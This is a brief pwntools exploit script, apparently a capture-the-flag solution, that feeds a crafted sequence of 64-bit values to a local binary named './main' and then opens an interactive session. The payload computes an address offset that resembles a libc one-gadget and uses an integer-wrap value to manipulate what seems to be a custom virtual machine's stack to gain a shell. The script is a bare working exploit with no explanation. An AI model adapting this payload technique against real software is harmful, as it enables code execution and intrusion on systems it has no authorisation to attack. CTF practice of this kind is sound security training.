from pwn import *
p = process('./main')
MAX = 0x10000000000000000
payload =  ""
payload += p64(1) + p64(0x5D4000 - 0x45216)
payload += p64(26) 
payload += p64(13)
payload += p64(26) #just to make add sp,8
payload += p64(1) + p64(0xE8)
payload += p64(26)
payload += p64(13)
payload += p64(0) + p64(MAX - 5)
payload += p64(9)
payload += p64(11)
#gdb.attach(p,"b* $rebase(0xE43)")
p.send(payload)
p.interactive()
